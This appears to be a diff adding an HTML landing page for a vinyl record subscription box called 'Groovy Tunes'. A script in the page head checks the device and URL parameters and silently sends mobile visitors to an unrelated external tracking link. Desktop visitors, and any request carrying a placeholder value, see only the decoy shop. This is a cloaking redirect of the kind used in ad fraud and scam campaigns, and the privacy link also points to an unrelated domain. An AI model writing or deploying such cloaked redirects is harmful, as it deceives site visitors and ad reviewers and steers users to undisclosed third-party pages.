@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Groovy Tunes: Vintage Vinyl Subscription Box</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f0e68c;
+            color: #333;
+        }
+        header {
+            background-color: #8b4513;
+            color: #f0e68c;
+            text-align: center;
+            padding: 1rem;
+        }
+        main {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+        }
+        .subscription-plan {
+            background-color: white;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .subscribe-button {
+            background-color: #cd853f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+        footer {
+            background-color: #8b4513;
+            color: #f0e68c;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Groovy Tunes</h1>
+        <p>Vintage Vinyl Delivered Monthly</p>
+    </header>
+    <main>
+        <div class="subscription-plan">
+            <h2>The Classic Mix</h2>
+            <p>One handpicked vintage vinyl record from various genres each month.</p>
+            <button class="subscribe-button">Subscribe - $29.99/mo</button>
+        </div>
+        <div class="subscription-plan">
+            <h2>Rock 'n' Roll Package</h2>
+            <p>Two classic rock vinyl records every month, from the 60s to the 80s.</p>
+            <button class="subscribe-button">Subscribe - $49.99/mo</button>
+        </div>
+        <div class="subscription-plan">
+            <h2>Jazz Enthusiast Collection</h2>
+            <p>Three jazz vinyl records monthly, featuring legendary artists and rare finds.</p>
+            <button class="subscribe-button">Subscribe - $69.99/mo</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Groovy Tunes. Keep the vinyl spinning!</p>
+        <a href="https://tokreward.com/privacy.html" style="color: #f0e68c;">Privacy Policy</a>
+    </footer>
+</body>
+</html>
